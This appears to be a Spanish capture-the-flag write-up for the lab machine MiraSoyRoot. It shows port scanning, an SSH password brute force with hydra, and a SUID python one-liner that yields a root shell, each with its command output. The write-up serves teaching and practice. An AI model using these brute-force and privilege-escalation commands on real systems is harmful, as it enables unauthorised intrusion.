---
layout: post
title: Mirasoyroot
subtitle: Plataforma MiraSoyRoot Dificultad Muy Fácil
cover-img: /assets/img/mirasoyroot.png
thumbnail-img: /assets/img/mirasoyroot.png
share-img: /assets/img/mirasoyroot.png
author: Elmili72
---

![mirasoyroot](https://github.com/user-attachments/assets/bd2573ef-3808-46df-9b21-c248c8e94fc0)

## Escaneo general de puertos

Como siempre, emepezamos realizando un escaneo de los puertos que pudiera tener abiertos nuestra víctima.

```bash
❯ sudo nmap -sS -p- --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allports
Host is up, received arp-response (0.0000020s latency).
Scanned at 2025-06-23 16:24:17 CEST for 0s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)
```

## Escaneo específico de puertos

Una vez conocidos, realizaremos un escaneo específico de los puertos encontrados para conocer los servicios y la versión de estos. En este caso de los puertos 22 (SSH) y 80 (HTTP).

```bash
❯ nmap -sCV -p22,80 172.17.0.2 -oN escaneo
Host is up (0.000030s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 03:56:8c:b4:94:cc:4b:c5:66:08:73:43:68:68:25:96 (ECDSA)
|_  256 ce:44:d8:21:9b:a5:7c:79:df:3c:d5:e1:d5:8a:d2:ae (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: M\xC3\xA1quina Vulnerable
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Reconocimiento Servicio Web

Al ver el servicio web es conveniente realizar un reconocimiento incial de este, para ver por encima el contenido y como está montado. De primeras nada demasiado importante (obviando que nos dice que el título es máquina vulnerable jajaja).

```bash
❯ whatweb http://172.17.0.2
http://172.17.0.2 [200 OK] Apache[2.4.58], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[172.17.0.2], Title[Máquina Vulnerable]
```

![Pasted image 20250623162730](https://github.com/user-attachments/assets/0ab0ee0a-07c5-40a0-9605-c27992a1c428)

No aparece nada útil en la fuente de la página. Por lo que podemos probarlo como usuario para la fuerza bruta contra el servicio SSH.
## Explotación

Al no encontrar otra vulnerabilidad diferente para explotar en la máquina, directamente, podemos usar hydra para realizar la intrusión al sistema.
### Intrusión

Y efectivamente conseguimos la contraseña del usuario *yerman*.

```bash
❯ hydra -l yerman -P /usr/share/wordlists/rockyou.txt -t 64 ssh://172.17.0.2
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-23 16:29:14
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: yerman   password: teamo
1 of 1 target successfully completed, 1 valid password found
```

```bash
yerman@50df4a4188d9:~$ whoami
yerman
yerman@50df4a4188d9:~$ id
uid=1001(yerman) gid=1001(yerman) groups=1001(yerman),100(users)
```

## Post-Explotación

Miramos en el archivo */etc/passwd* y no vemos usuarios adicionales, por lo que podemos pensar que no hace falta realizar pivoting. Así que, como siempre, lo que más nos gusta. Toca escalar privilegios :D.
### Escalada de Privilegios

Realicé un *sudo -l* pero no nos permite usar *sudo* directamente, por lo que podemos buscar binarios o archivos con permisos *SUID* para explotarlos y conseguir nuestra escalada. Vemos el binario *python*, tal y como en el anterior writeup de la máquina anonymous.

```bash
yerman@50df4a4188d9:~$ find / -perm -4000 2>/dev/null
/usr/local/bin/python
/usr/bin/mount
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/su
/usr/bin/newgrp
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

Como siempre, si no estás acostumbrado o estás empezando en estos casos siempre recomiendo *GTFOBins* y os lo da muy claro. De todas formas es un oneliner de python muy sencillito con el que generamos una bash, a partir, de el binario explotable. (Intenté darle permisos *SUID* a la propia bash para no tener que realizar este comando todo el rato, pero no supe como, me toca aprender python1 D:).

```bash
yerman@50df4a4188d9:/tmp/privesc$ /usr/local/bin/python -c 'import os; os.execl("/bin/bash", "bash", "-p")'
bash-5.2# whoami
root
bash-5.2# id
uid=1001(yerman) gid=1001(yerman) euid=0(root) groups=1001(yerman),100(users)
```

Y así conseguimos nuestro usuario *root* y leemos el contanido de la flag.

```bash
bash-5.2# cd /root
bash-5.2# pwd
/root
bash-5.2# ls
mirasoyroot.txt
bash-5.2# ls -la
total 28
drwx------ 1 root root 4096 Jan 31 13:16 .
drwxr-xr-x 1 root root 4096 Jun 23 16:23 ..
-rw-r--r-- 1 root root 3106 Apr 22  2024 .bashrc
drwxr-xr-x 3 root root 4096 Jan 31 13:12 .local
-rw-r--r-- 1 root root  161 Apr 22  2024 .profile
drwx------ 2 root root 4096 Jan 31 13:09 .ssh
-rw-r--r-- 1 root root  140 Jan 31 13:16 mirasoyroot.txt
bash-5.2# cat mirasoyroot.txt 
Enhorabuena hacker lo has conseguido, si eres de los tres primeros en completar la máquina háblame por Instagram y te pondré en el podio
```

¡Espero que os haya gustado y os haya servido de ayuda! ¡Hasta el próximo writeup!
